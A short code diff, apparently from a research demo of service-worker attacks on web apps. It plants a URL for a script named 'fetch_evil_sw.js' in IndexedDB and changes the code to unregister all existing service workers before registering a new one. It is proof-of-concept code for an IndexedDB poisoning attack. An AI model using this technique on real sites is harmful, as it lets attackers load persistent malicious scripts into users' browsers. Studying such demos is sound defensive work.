@@ -46,7 +46,14 @@
                      var store = txn.objectStore('urls')
                      store.put({'id':'report_url', 'url':'https://demopwa.github.io/SW_Attacks/IndexDBPoisoning/fetch_evil_sw.js'})
                       if('serviceWorker' in navigator) {
-			      navigator.serviceWorker.unregister()
+			      navigator.serviceWorker.getRegistrations().then(function(registrations) {
+				    for(let registration of registrations) {
+					    registration.unregister()
+				    }
+			      }).catch(function(err) {
+					console.log('Service Worker registration failed: ', err);
+			      });
+			      
 			      navigator.serviceWorker.register('./sw.js');
 		      };
               }
